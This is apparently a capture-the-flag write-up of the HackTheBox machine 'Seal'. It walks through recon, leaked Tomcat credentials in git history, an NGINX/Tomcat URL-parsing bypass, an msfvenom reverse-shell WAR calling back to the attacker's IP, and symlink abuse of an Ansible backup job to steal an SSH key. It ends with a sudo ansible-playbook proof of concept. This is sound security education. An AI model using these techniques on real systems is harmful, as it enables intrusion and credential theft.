---
title: HTB: Seal
url: https://0xdf.gitlab.io/2021/11/13/htb-seal.html
date: 2021-11-13T14:45:00+00:00
difficulty: Medium [30]
os: Linux
tags: hackthebox, ctf, htb-seal, nmap, wfuzz, vhosts, nginx, tomcat, feroxbuster, git-bucket, off-by-slash, git, mutual-authentication, uri-parsing, war, msfvenom, ansible, htb-tabby, breaking-parser-logic, oscp-like-v2, osep-like
---

![Seal](https://0xdfimages.gitlab.io/img/seal-cover.png)

In Seal, I’ll get access to the NGINX and Tomcat configs, and find both Tomcat passwords and a misconfiguration that allows me to bypass the certificate-based authentication by abusing differences in how NGINX and Tomcat parse urls. The rest of the box is about Ansible, the automation platform. I’ll abuse a backup playbook being run on a cron to get the next user. And I’ll write my own playbook and abuse sudo to get root.

## Box Info

| Name | [Seal](https://hackthebox.com/machines/seal)  [Seal](https://hackthebox.com/machines/seal) [Play on HackTheBox](https://hackthebox.com/machines/seal) |
| --- | --- |
| Release Date | [10 Jul 2021](https://twitter.com/hackthebox_eu/status/1412764785574387712) |
| Retire Date | 13 Nov 2021 |
| OS | Linux Linux |
| Base Points | Medium [30] |
| Rated Difficulty | Rated difficulty for Seal |
| Radar Graph | Radar chart for Seal |
| First Blood User | 00:51:24[jkr jkr](https://app.hackthebox.com/users/77141) |
| First Blood Root | 00:54:08[jkr jkr](https://app.hackthebox.com/users/77141) |
| Creator | [MrR3boot MrR3boot](https://app.hackthebox.com/users/13531) |

## Recon

### nmap

`nmap` found three open TCP ports, SSH (22), HTTPS (443), and something HTTP-like (8080):

```

oxdf@parrot$ nmap -p- --min-rate 10000 -oA scans/nmap-alltcp 10.10.10.250
Starting Nmap 7.91 ( https://nmap.org ) at 2021-08-20 20:51 EDT
Note: Host seems down. If it is really up, but blocking our ping probes, try -Pn
Nmap done: 1 IP address (0 hosts up) scanned in 2.14 seconds
oxdf@parrot$ nmap -p- --min-rate 10000 -oA scans/nmap-alltcp 10.10.10.250
Starting Nmap 7.91 ( https://nmap.org ) at 2021-08-20 20:51 EDT
Nmap scan report for 10.10.10.250
Host is up (0.066s latency).
Not shown: 65532 closed ports
PORT     STATE SERVICE
22/tcp   open  ssh
443/tcp  open  https
8080/tcp open  http-proxy

Nmap done: 1 IP address (1 host up) scanned in 109.80 seconds
oxdf@parrot$ nmap -p 22,443,8080 -sCV -oA scans/nmap-tcpscripts 10.10.10.250
Starting Nmap 7.91 ( https://nmap.org ) at 2021-08-20 20:56 EDT
Nmap scan report for 10.10.10.250
Host is up (0.020s latency).

PORT     STATE SERVICE    VERSION
22/tcp   open  ssh        OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 4b:89:47:39:67:3d:07:31:5e:3f:4c:27:41:1f:f9:67 (RSA)
|   256 04:a7:4f:39:95:65:c5:b0:8d:d5:49:2e:d8:44:00:36 (ECDSA)
|_  256 b4:5e:83:93:c5:42:49:de:71:25:92:71:23:b1:85:54 (ED25519)
443/tcp  open  ssl/http   nginx 1.18.0 (Ubuntu)
|_http-server-header: nginx/1.18.0 (Ubuntu)
|_http-title: Seal Market
| ssl-cert: Subject: commonName=seal.htb/organizationName=Seal Pvt Ltd/stateOrProvinceName=London/countryName=UK
| Not valid before: 2021-05-05T10:24:03
|_Not valid after:  2022-05-05T10:24:03
| tls-alpn: 
|_  http/1.1
| tls-nextprotoneg: 
|_  http/1.1
8080/tcp open  http-proxy
| fingerprint-strings: 
|   FourOhFourRequest: 
|     HTTP/1.1 401 Unauthorized
|     Date: Sat, 21 Aug 2021 00:59:51 GMT
|     Set-Cookie: JSESSIONID=node0gavl59qm2zrx1qhzhowcumpi72.node0; Path=/; HttpOnly
|     Expires: Thu, 01 Jan 1970 00:00:00 GMT
|     Content-Type: text/html;charset=utf-8
|     Content-Length: 0
|   GetRequest: 
|     HTTP/1.1 401 Unauthorized
|     Date: Sat, 21 Aug 2021 00:59:50 GMT
|     Set-Cookie: JSESSIONID=node0drs9zl7mym6gi9hyziw3t1m90.node0; Path=/; HttpOnly
|     Expires: Thu, 01 Jan 1970 00:00:00 GMT
|     Content-Type: text/html;charset=utf-8
|     Content-Length: 0
|   HTTPOptions: 
|     HTTP/1.1 200 OK
|     Date: Sat, 21 Aug 2021 00:59:51 GMT
|     Set-Cookie: JSESSIONID=node01q9qys7bogc7sqx9vdtz49od11.node0; Path=/; HttpOnly
|     Expires: Thu, 01 Jan 1970 00:00:00 GMT
|     Content-Type: text/html;charset=utf-8
|     Allow: GET,HEAD,POST,OPTIONS
|     Content-Length: 0
|   RPCCheck: 
|     HTTP/1.1 400 Illegal character OTEXT=0x80
|     Content-Type: text/html;charset=iso-8859-1
|     Content-Length: 71
|     Connection: close
|     <h1>Bad Message 400</h1><pre>reason: Illegal character OTEXT=0x80</pre>
|   RTSPRequest: 
|     HTTP/1.1 505 Unknown Version
|     Content-Type: text/html;charset=iso-8859-1
|     Content-Length: 58
|     Connection: close
|     <h1>Bad Message 505</h1><pre>reason: Unknown Version</pre>
|   Socks4: 
|     HTTP/1.1 400 Illegal character CNTL=0x4
|     Content-Type: text/html;charset=iso-8859-1
|     Content-Length: 69
|     Connection: close
|     <h1>Bad Message 400</h1><pre>reason: Illegal character CNTL=0x4</pre>
|   Socks5: 
|     HTTP/1.1 400 Illegal character CNTL=0x5
|     Content-Type: text/html;charset=iso-8859-1
|     Content-Length: 69
|     Connection: close
|_    <h1>Bad Message 400</h1><pre>reason: Illegal character CNTL=0x5</pre>
| http-auth: 
| HTTP/1.1 401 Unauthorized\x0D
|_  Server returned status 401 but no WWW-Authenticate header.
|_http-title: Site doesn't have a title (text/html;charset=utf-8).
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port8080-TCP:V=7.91%I=7%D=8/20%Time=61204F3F%P=x86_64-pc-linux-gnu%r(Ge
SF:tRequest,F3,"HTTP/1\.1\x20401\x20Unauthorized\r\nDate:\x20Sat,\x2021\x2
...[snip]...
SF:ent-Length:\x2071\r\nConnection:\x20close\r\n\r\n<h1>Bad\x20Message\x20
SF:400</h1><pre>reason:\x20Illegal\x20character\x20OTEXT=0x80</pre>");
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 15.10 seconds

```

Based on the [OpenSSH](https://packages.ubuntu.com/search?keywords=openssh-server) version, the host is likely running Ubuntu 20.04 Focal.

There’s a domain name on the TLS certificate, `seal.htb`.

### VHost

Given the domain name, I’ll fuzz for virtual hosts with `wfuzz`. I’ll start with no filtering, just giving it the url (`-u`), the wordlist (`-w`), and the instruction to put the word from the wordlist into the `Host:` header (`-H`):

```

oxdf@parrot$ wfuzz -u https://10.10.10.250 -H 'Host: FUZZ.seal.htb' -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt 
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: https://10.10.10.250/
Total requests: 19966

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                                  
=====================================================================

000000001:   200        518 L    1140 W     19737 Ch    "www"
000000003:   200        518 L    1140 W     19737 Ch    "ftp"
000000007:   200        518 L    1140 W     19737 Ch    "webdisk"
000000015:   200        518 L    1140 W     19737 Ch    "ns"
000000031:   200        518 L    1140 W     19737 Ch    "mobile"
000000050:   200        518 L    1140 W     19737 Ch    "wiki"
000000049:   200        518 L    1140 W     19737 Ch    "server"
^C

```

Clearly the default case has 19737 characters. I’ll add `--hh 19737` and re-run:

```

oxdf@parrot$ wfuzz -u https://10.10.10.250 -H 'Host: FUZZ.seal.htb' -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt --hh 19737
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: https://10.10.10.250/
Total requests: 19966

=====================================================================
ID           Response   Lines    Word       Chars       Payload
=====================================================================

000000689:   400        16 L     122 W      2250 Ch     "gc._msdcs"
000009532:   400        14 L     100 W      1949 Ch     "#www"
000010581:   400        14 L     100 W      1949 Ch     "#mail"
000019834:   400        14 L     100 W      1949 Ch     "_domainkey"

Total time: 61.83789
Processed Requests: 19966
Filtered Requests: 19962
Requests/sec.: 322.8764

```

Those odd domains with 400 responses look more like errors that legit matches. So nothing here. I’ll add `seal.htb` to `/etc/hosts`.

### HTTPS Website - TCP 443

#### Site

The site is for a market, and the page loads the same by IP or seal.htb:

[![image-20210903152853888](https://0xdfimages.gitlab.io/img/image-20210903152853888.png)](https://0xdfimages.gitlab.io/img/image-20210903152853888.png)

[*Click for full image*](https://0xdfimages.gitlab.io/img/image-20210903152853888.png)

There are two forms on the site that take input, a search and a contact us.

Both forms sticks all the inputs in as GET parameters, and the page that returns is the exact same as the page with no parameters:

```

GET /?Your+Name=0xdf&Email=0xdf%40seal.htb&Phone+Number=9999&Message=9999 HTTP/1.1
Host: seal.htb
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:94.0) Gecko/20100101 Firefox/94.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: https://seal.htb/
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1
Te: trailers
Connection: close

```

Neither seems to do anything.

#### Tech Stack

Guessing at the root page, `index.html` loads the same page, whereas `/index` and `/index.php` both return 404. Still, the 404 pages reveal that it’s a Tomcat server:

![image-20210903153437593](https://0xdfimages.gitlab.io/img/image-20210903153437593.png)

#### Directory Brute Force

I’ll run `feroxbuster` against the site:

```

oxdf@parrot$ feroxbuster -u https://seal.htb -k

 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.3.1
───────────────────────────┬──────────────────────
 🎯  Target Url            │ https://seal.htb
 🚀  Threads               │ 50
 📖  Wordlist              │ /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt
 👌  Status Codes          │ [200, 204, 301, 302, 307, 308, 401, 403, 405]
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.3.1
 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
 🔓  Insecure              │ true
 🔃  Recursion Depth       │ 4
 🎉  New Version Available │ https://github.com/epi052/feroxbuster/releases/latest
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Cancel Menu™
──────────────────────────────────────────────────
302        0l        0w        0c https://seal.htb/admin
302        0l        0w        0c https://seal.htb/images
302        0l        0w        0c https://seal.htb/css
302        0l        0w        0c https://seal.htb/js
302        0l        0w        0c https://seal.htb/manager
302        0l        0w        0c https://seal.htb/icon
[####################] - 33s    29999/29999   0s      found:6       errors:0      
[####################] - 32s    29999/29999   918/s   https://seal.htb

```

`/manager` is a common path for Tomcat webservers. `/manager/html` is the GUI based admin panel, and `/manager/text/` is the text-based version (I used this in [Tabby](/2020/11/07/htb-tabby.html#text-based-manager)).

`/admin/` is also interesting.

#### /manager

It’s interesting that `feroxbuster` didn’t find `/manager/html/` or `/manager/text/`. When I try to check out `/manager` in Firefox, it can’t connect:

![image-20210903154004678](https://0xdfimages.gitlab.io/img/image-20210903154004678.png)

`curl` shows what’s happening more clearly:

```

oxdf@parrot$ curl -k -I https://seal.htb/manager
HTTP/1.1 302 
Server: nginx/1.18.0 (Ubuntu)
Date: Fri, 03 Sep 2021 19:47:06 GMT
Connection: keep-alive
Location: http://seal.htb/manager/

```

Trying to visit `https://seal.htb/manager` is redirecting to `http://seal.htb/manager/`. It dropped the HTTPS and went back to TCP 80, which isn’t listening.

That seems to be a common misconfiguration, as going back to `/manager/` on HTTPS returns a redirect to `/manager/http`. This is expected, except it’s back on HTTP again:

```

oxdf@parrot$ curl -k -I https://seal.htb/manager/
HTTP/1.1 302 
Server: nginx/1.18.0 (Ubuntu)
Date: Fri, 03 Sep 2021 19:47:49 GMT
Content-Type: text/html
Connection: keep-alive
Location: http://seal.htb/manager/html

```

Checking manually https returns 403:

```

oxdf@parrot$ curl -k -I https://seal.htb/manager/html
HTTP/1.1 403 Forbidden
Server: nginx/1.18.0 (Ubuntu)
Date: Fri, 03 Sep 2021 19:48:44 GMT
Content-Type: text/html
Content-Length: 162
Connection: keep-alive

```

If I try to visit `/manager/text`, it returns a 401 asking for creds (`WWW-Authenticate` header):

```

oxdf@parrot$ curl -k -I https://seal.htb/manager/text
HTTP/1.1 401 
Server: nginx/1.18.0 (Ubuntu)
Date: Fri, 03 Sep 2021 19:49:49 GMT
Content-Type: text/html;charset=ISO-8859-1
Connection: keep-alive
Cache-Control: private
Expires: Thu, 01 Jan 1970 00:00:00 GMT
WWW-Authenticate: Basic realm="Tomcat Manager Application"

```

#### /admin

`/admin` also does the misconfigured redirect to port 80. On manually adding the trailing `/`, it returns 404:

![image-20211108091601275](https://0xdfimages.gitlab.io/img/image-20211108091601275.png)

This response is a good indication that this is a directory with no index. If I run `feroxbuster` against this path, it finds two paths that return 403 Not Authorized:

```

oxdf@parrot$ feroxbuster -k -u https://seal.htb/admin/

 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.4.0
───────────────────────────┬──────────────────────
 🎯  Target Url            │ https://seal.htb/admin/
 🚀  Threads               │ 50
 📖  Wordlist              │ /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt
 👌  Status Codes          │ [200, 204, 301, 302, 307, 308, 401, 403, 405, 500]
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.4.0
 🔓  Insecure              │ true
 🔃  Recursion Depth       │ 4
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Cancel Menu™
──────────────────────────────────────────────────
403        7l       10w      162c https://seal.htb/admin/dashboard
403        7l       10w      162c https://seal.htb/admin/dashboards
[####################] - 33s    29999/29999   0s      found:2       errors:0      
[####################] - 32s    29999/29999   925/s   https://seal.htb/admin/

```

### GitBucket - TCP 8080

#### Site

This webserver is an instance of GitBucket, which immediately redirects to a login page:

![image-20210903154900217](https://0xdfimages.gitlab.io/img/image-20210903154900217.png)

I’ll create an account and log in:

[![image-20210903155041421](https://0xdfimages.gitlab.io/img/image-20210903155041421.png)](https://0xdfimages.gitlab.io/img/image-20210903155041421.png)

[*Click for full image*](https://0xdfimages.gitlab.io/img/image-20210903155041421.png)

There are two repos, with a bunch of activity in the feed. The root/Infra repo has a playbook for creating a Tomcat instance, but nothing too interesting.

#### root/seal\_market

The seal\_market repo has a `README.md` with a todo list:

![image-20210903160523513](https://0xdfimages.gitlab.io/img/image-20210903160523513.png)

The site is using NGINX and Tomcat (as I already figured out). The note says they are planning to remove “mutual authentication” for the dashboard. Some Googling confirmed that mutual authentication is when the server requires a client certificate that authenticates them to provide access. Looking up “nginx mutual authentication”, [this post](https://smallstep.com/hello-mtls/doc/server/nginx) shows that it’s done with something that looks like:

```

    location / {
      if ($ssl_client_verify != SUCCESS) {
        return 403;
      }

```

The `app` folder has `/admin/dashboard` with a static `index.html`, and some CSS, images, etc.

#### Tomcat Configs

The `tomcat` folder has configuration files for a Tomcat server:

![image-20210903164753889](https://0xdfimages.gitlab.io/img/image-20210903164753889.png)

There’s nothing exciting in these, but if I check the commits button, it gives the history (not sure why the image above says five commits but this page only shows two):

![image-20210903164845655](https://0xdfimages.gitlab.io/img/image-20210903164845655.png)

The “Adding tomcat configuration” creates all these files, but “Updating tomcat configuration” just shows changes to one file:

![image-20210903165047510](https://0xdfimages.gitlab.io/img/image-20210903165047510.png)

The username tomcat, password “42MrHBf\*z8{Z%”. And, the todo list said that they still needed to update, which implies this is still in place. Unfortunately, I still get a 403 when trying to access `/manager/html`, which is where these would be used. I could try the text-based manager, but I don’t have that role (would show `manager-script` in `roles`).

#### NGINX Configs

`/nginx` also has the config files for an installation, likely the one running on Seal:

[![image-20210903165312471](https://0xdfimages.gitlab.io/img/image-20210903165312471.png)](https://0xdfimages.gitlab.io/img/image-20210903165312471.png)

[*Click for full image*](https://0xdfimages.gitlab.io/img/image-20210903165312471.png)

The first thing I wanted to look at was `sites-enabled`, where there’s one config file, `default`. Here it is (with unnecessary comments removed):

```

ssl_certificate /var/www/keys/selfsigned.crt;
ssl_certificate_key /var/www/keys/selfsigned.key;
ssl_client_certificate /var/www/keys/selfsigned-ca.crt;
 
server {
	listen 443 ssl default_server;
	listen [::]:443 ssl default_server;

	root /var/www/html;
	ssl_protocols TLSv1.1 TLSv1.2;
	ssl_verify_client optional;

	index index.html index.htm index.nginx-debian.html;
 
	server_name _;
 
	location /manager/html {
		if ($ssl_client_verify != SUCCESS) {
			return 403;
		}
		proxy_set_header        Host $host;
		proxy_set_header        X-Real-IP $remote_addr;
		proxy_set_header        X-Forwarded-For $proxy_add_x_forwarded_for;
		proxy_set_header        X-Forwarded-Proto $scheme;
		proxy_pass          http://localhost:8000;
		proxy_read_timeout  90;
		proxy_redirect      http://localhost:8000 https://0.0.0.0;
	}

	location /admin/dashboard {
		if ($ssl_client_verify != SUCCESS) {
			return 403;
		}
		proxy_set_header        Host $host;
		proxy_set_header        X-Real-IP $remote_addr;
		proxy_set_header        X-Forwarded-For $proxy_add_x_forwarded_for;
		proxy_set_header        X-Forwarded-Proto $scheme;
		proxy_pass          http://localhost:8000;
		proxy_read_timeout  90;
		proxy_redirect      http://localhost:8000 https://0.0.0.0;
	}
 
        location /host-manager/html {
                if ($ssl_client_verify != SUCCESS) {
                        return 403;
                }
                proxy_set_header        Host $host;
                proxy_set_header        X-Real-IP $remote_addr;
                proxy_set_header        X-Forwarded-For $proxy_add_x_forwarded_for;
                proxy_set_header        X-Forwarded-Proto $scheme;
                proxy_pass          http://localhost:8000;
                proxy_read_timeout  90;
                proxy_redirect      http://localhost:8000 https://0.0.0.0;
                # First attempt to serve request as file, then
                # as directory, then fall back to displaying a 404.
#               try_files $uri $uri/ =404;
        }

	location / {
                proxy_set_header        Host $host;
                proxy_set_header        X-Real-IP $remote_addr;
                proxy_set_header        X-Forwarded-For $proxy_add_x_forwarded_for;
                proxy_set_header        X-Forwarded-Proto $scheme;
                proxy_pass          http://localhost:8000;
                proxy_read_timeout  90;
                proxy_redirect      http://localhost:8000 https://0.0.0.0;
	}	

```

The first three paths, `/manager/html`, `/admin/dashboard`, and `/host-manager/html` are each set up with the mutual authentication check just like the example above. If the client is authenticated, it will proxy the request to `http://localhost:8000`, which must be where Tomcat is actually listening.

## Shell as tomcat

### Access Tomcat Manager

Some Googling for NGINX Tomcat misconfigurations, the third link was a [Blackhat presentatin by Orange Tsai](https://i.blackhat.com/us-18/Wed-August-8/us-18-Orange-Tsai-Breaking-Parser-Logic-Take-Your-Path-Normalization-Off-And-Pop-0days-Out-2.pdf) (if your Google results include something by Orange, start there). The title is Breaking Parser Logic, and it looks at different ways to trick different servers.

The example in the presentation looks like:

![image-20210903170156205](https://0xdfimages.gitlab.io/img/image-20210903170156205.png)

It’s not clear to me if Seal has Apache running, but otherwise it looks the same. This slide shows the issue I’ll exploit on Seal:

![image-20210903170242220](https://0xdfimages.gitlab.io/img/image-20210903170242220.png)

If I pass a URL like `https://seal.htb/manager;name=0xdf/html`, NGINX will see it as that full URL, but Tomcat will treat it as `https://seal.htb/manager/html`. The first URL won’t match on `location /manager/html`, so it won’t check for mutual auth. Instead, it will be forwarded on to Tomcat. But then Tomcat will see just `/manager/html`, and return that page. It works:

![image-20210903170504319](https://0xdfimages.gitlab.io/img/image-20210903170504319.png)

Giving it the creds from the old config in BitBucket, allows access:

[![image-20210903170602960](https://0xdfimages.gitlab.io/img/image-20210903170602960.png)](https://0xdfimages.gitlab.io/img/image-20210903170602960.png)

[*Click for full image*](https://0xdfimages.gitlab.io/img/image-20210903170602960.png)

### Shell

With access to the manager panel, I’ll create a malicious WAR file using `msfvenom`:

```

oxdf@parrot$ msfvenom -p java/shell_reverse_tcp lhost=10.10.14.22 lport=443 -f war -o rev.war
Payload size: 13316 bytes
Final size of war file: 13316 bytes
Saved as: rev.war

```

I’ll select it with the WAR file to deploy section:

![image-20210903170815101](https://0xdfimages.gitlab.io/img/image-20210903170815101.png)

And push Deploy. It shows up in the applications:

![image-20210903170835848](https://0xdfimages.gitlab.io/img/image-20210903170835848.png)

With `nc` listening, I’ll click `/rev` and it hangs, and a shell connects:

```

oxdf@parrot$ msfvenom -p java/shell_reverse_tcp lhost=10.10.14.22 lport=443 -f war -o rev.war
Payload size: 13316 bytes
Final size of war file: 13316 bytes
Saved as: rev.war
oxdf@parrot$ nc -lnvp 443
listening on [any] 443 ...
connect to [10.10.14.22] from (UNKNOWN) [10.10.10.250] 36418
id
uid=997(tomcat) gid=997(tomcat) groups=997(tomcat)

```

I’ll upgrade the shell using `script`:

```

script /dev/null -c bash
Script started, file is /dev/null 
tomcat@seal:/var/lib/tomcat9$ ^Z
[1]+  Stopped                 nc -lnvp 443
oxdf@parrot$ stty raw -echo; fg
nc -lnvp 443
            reset
reset: unknown terminal type unknown
Terminal type? screen
tomcat@seal:/var/lib/tomcat9$

```

## Shell as luis

### Enumeration

#### Home Directories

There’s one folder in `/home`, and I can read from it, but not `user.txt`:

```

tomcat@seal:/home/luis$ ls -l
total 51272
-rw-r--r-- 1 luis luis 52497951 Jan 14  2021 gitbucket.war
-r-------- 1 luis luis       33 Sep  3 19:27 user.txt

```

`gitbucket.war` is the way to run GitBucket (from the [front page of the website](https://gitbucket.github.io/)):

![image-20210903172117972](https://0xdfimages.gitlab.io/img/image-20210903172117972.png)

So I’ll leave that be for now.

#### /opt

`/opt` has a `backups` folder:

```

tomcat@seal:/opt$ ls
backups
tomcat@seal:/opt$ cd backups/
tomcat@seal:/opt/backups$ ls
archives  playbook

```

The `archives` folder has two `.gz` archives with timestamps in the filenames that are less than two minutes old:

```

tomcat@seal:/opt/backups$ ls -l archives/
-rw-rw-r-- 1 luis luis 606047 Sep  3 21:25 backup-2021-09-03-21:25:33.gz
-rw-rw-r-- 1 luis luis 606047 Sep  3 21:26 backup-2021-09-03-21:26:32.gz
tomcat@seal:/opt/backups$ date
Fri 03 Sep 2021 09:27:24 PM UTC

```

These backup files are owned by luis. Two minutes later, there are more:

```

tomcat@seal:/opt/backups$ ls archives/
backup-2021-09-03-21:25:33.gz  backup-2021-09-03-21:27:32.gz
backup-2021-09-03-21:26:32.gz  backup-2021-09-03-21:28:32.gz

```

The `playbook` folder has a single file, `run.yml`:

```
- hosts: localhost
  tasks:
  - name: Copy Files
    synchronize: src=/var/lib/tomcat9/webapps/ROOT/admin/dashboard dest=/opt/backups/files copy_links=yes
  - name: Server Backups
    archive:
      path: /opt/backups/files/
      dest: "/opt/backups/archives/backup--.gz"
  - name: Clean
    file:
      state: absent
      path: /opt/backups/files/

```

This looks to be what’s running each minute. It is an [Ansible](https://www.ansible.com/) playbook with three tasks. Ansible describes itself as:

> Ansible is a universal language, unraveling the mystery of how work gets done. Turn tough tasks into repeatable playbooks. Roll out enterprise-wide protocols with the push of a button.

The three tasks:
- “Copy Files” takes all the files for the dashboard and copies them into a folder in this directory, `files`, using the [synchronize](https://docs.ansible.com/ansible/latest/collections/ansible/posix/synchronize_module.html) module. It’s important to note the `copy_links=yes` directive.
- “Server Backups” runs the [archive](https://docs.ansible.com/ansible/2.5/modules/archive_module.html) module which generates the `.gz` file with the timestamp.
- “Clean” removes the `files` directory using the [file](https://docs.ansible.com/ansible/latest/collections/ansible/builtin/file_module.html) module.

### Exploit

In order to exploit this, I’ll need to look for something I can write in the Tomcat web directory. The `uploads` folder works:

```

tomcat@seal:/var/lib/tomcat9/webapps/ROOT/admin/dashboard$ find . -writable
./uploads

```

The most straight forward way to abuse this is to get access to files as luis, the user who is running this playbook. I’ll create a symlink to luis’ home directory in the uploads folder:

```

tomcat@seal:/$ ln -s /home/luis/ /var/lib/tomcat9/webapps/ROOT/admin/dashboard/uploads/

```

The next backup is larger:

```

tomcat@seal:/$ ls -l /opt/backups/archives/
total 15784
-rw-rw-r-- 1 luis luis   608916 Sep  4 07:55 backup-2021-09-04-07:55:32.gz
-rw-rw-r-- 1 luis luis   608916 Sep  4 07:56 backup-2021-09-04-07:56:33.gz
-rw-rw-r-- 1 luis luis   608916 Sep  4 07:57 backup-2021-09-04-07:57:33.gz
-rw-rw-r-- 1 luis luis   608916 Sep  4 07:58 backup-2021-09-04-07:58:33.gz
-rw-rw-r-- 1 luis luis 13721600 Sep  4 07:59 backup-2021-09-04-07:59:32.gz

```

I’ll copy it into `/dev/shm`, and examine it:

```

tomcat@seal:/dev/shm$ file backup-2021-09-04-07:59:32.gz 
backup-2021-09-04-07:37:32.gz: gzip compressed data, was "backup-2021-09-04-07:37:32", last modified: Sat Sep  4 07:37:40 2021, max compression, original size modulo 2^32 141936640

```

Running `gunzip` on it makes a tar archive:

```

tomcat@seal:/dev/shm$ gunzip backup-2021-09-04-07\:37\:32.gz 
tomcat@seal:/dev/shm$ file backup-2021-09-04-07\:37\:32 
backup-2021-09-04-07:37:32: POSIX tar archive

```

If I try to run `tar xf` on this file, it fails:

```

tomcat@seal:/dev/shm$ tar xf backup-2021-09-04-07\:59\:32 
tar: Cannot connect to backup-2021-09-04-07: resolve failed

```

That’s actually because `tar` treats the `:` as signifying that the part before it is a hostname it should be connecting to. I can fix this by renaming it without a `:`, or giving it the `--force-local` flag.

I could also have done the extraction in one step with tar from the start:

```

tomcat@seal:/dev/shm$ tar zxf backup-2021-09-04-07\:59\:32.gz --force-local
tomcat@seal:/dev/shm/dashboard$ ls   
bootstrap  css  images  index.html  scripts  uploads

```

From here I find luis’ homedir in `uploads`:

```

tomcat@seal:/dev/shm/dashboard/uploads$ ls
luis
tomcat@seal:/dev/shm/dashboard/uploads$ cd luis/
tomcat@seal:/dev/shm/dashboard/uploads/luis$ ls
gitbucket.war  user.txt

```

And I can grab the flag:

```

tomcat@seal:/dev/shm/dashboard/uploads/luis$ cat user.txt
715c92dd************************

```

### SSH

There’s also an SSH key in `.ssh`, and the public key matches what’s in `authorized_keys`:

```

tomcat@seal:/dev/shm/dashboard/uploads/luis/.ssh$ ls -l
total 12
-rw-r----- 1 tomcat tomcat  563 May  7 06:10 authorized_keys
-rw------- 1 tomcat tomcat 2590 May  7 06:10 id_rsa
-rw-r----- 1 tomcat tomcat  563 May  7 06:10 id_rsa.pub
tomcat@seal:/dev/shm/dashboard/uploads/luis/.ssh$ md5sum authorized_keys id_rsa.pub 
a03275942de46b5d0de68dfa7ef99e2a  authorized_keys
a03275942de46b5d0de68dfa7ef99e2a  id_rsa.pub

```

I’ll copy the private key (`id_rsa`) to my workstation and connect with SSH:

```

oxdf@parrot$ ssh -i ~/keys/seal-luis luis@seal.htb
...[snip]...
luis@seal:~$

```

## Shell as root

### Enumeration

luis can run `ansible-playbook` as root with `sudo`:

```

luis@seal:~$ sudo -l
Matching Defaults entries for luis on seal:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User luis may run the following commands on seal:
    (ALL) NOPASSWD: /usr/bin/ansible-playbook *

```

### Playbook POC

I’ll grab the playbook from `/opt` and use it as a template to make my own.

```
- hosts: localhost
  tasks:
  - name: ping
    shell: ping -c 1 10.10.14.22

```

I’ll start `tcpdump`, and run this:

```

luis@seal:/dev/shm$ ansible-playbook ping.yml 
[WARNING]: provided hosts list is empty, only localhost is available. Note that the implicit localhost does not match 'all'

PLAY [localhost] *******************************************************************************************************************

TASK [Gathering Facts] *************************************************************************************************************
ok: [localhost]

TASK [ping] ************************************************************************************************************************
changed: [localhost]

PLAY RECAP *************************************************************************************************************************
localhost                  : ok=2    changed=1    unreachable=0    failed=0    skipped=0    rescued=0    ignored=0

```

There’s nothing obvious in that output that it worked, but there is an ICMP packet:

```

oxdf@parrot$ sudo tcpdump -ni tun0 icmp
tcpdump: verbose output suppressed, use -v[v]... for full protocol decode
listening on tun0, link-type RAW (Raw IP), snapshot length 262144 bytes
04:13:59.649051 IP 10.10.10.250 > 10.10.14.22: ICMP echo request, id 1, seq 1, length 64
04:13:59.649082 IP 10.10.14.22 > 10.10.10.250: ICMP echo reply, id 1, seq 1, length 64

```

[This post](https://serverfault.com/questions/537060/how-to-see-stdout-of-ansible-commands) shows how I can get the output:

```
- hosts: localhost
  tasks:
  - name: ping
    shell: ping -c 1 10.10.14.22
    register: out
  - name: stdout
    debug: msg=""
  - name: stderr
    debug: msg=""

```

This shows the successful `ping` output in the `stdout` task output:

```

luis@seal:/dev/shm$ ansible-playbook ping.yml 
[WARNING]: provided hosts list is empty, only localhost is available. Note that the implicit localhost does not match 'all'

PLAY [localhost] *******************************************************************************************************************

TASK [Gathering Facts] *************************************************************************************************************
ok: [localhost]

TASK [ping] ************************************************************************************************************************
changed: [localhost]

TASK [stdout] **********************************************************************************************************************
ok: [localhost] => {
    "msg": "PING 10.10.14.22 (10.10.14.22) 56(84) bytes of data.\n64 bytes from 10.10.14.22: icmp_seq=1 ttl=63 time=18.2 ms\n\n--- 10.10.14.22 ping statistics ---\n1 packets transmitted, 1 received, 0% packet loss, time 0ms\nrtt min/avg/max/mdev = 18.160/18.160/18.160/0.000 ms"
}

TASK [stderr] **********************************************************************************************************************
ok: [localhost] => {
    "msg": ""
}

PLAY RECAP *************************************************************************************************************************
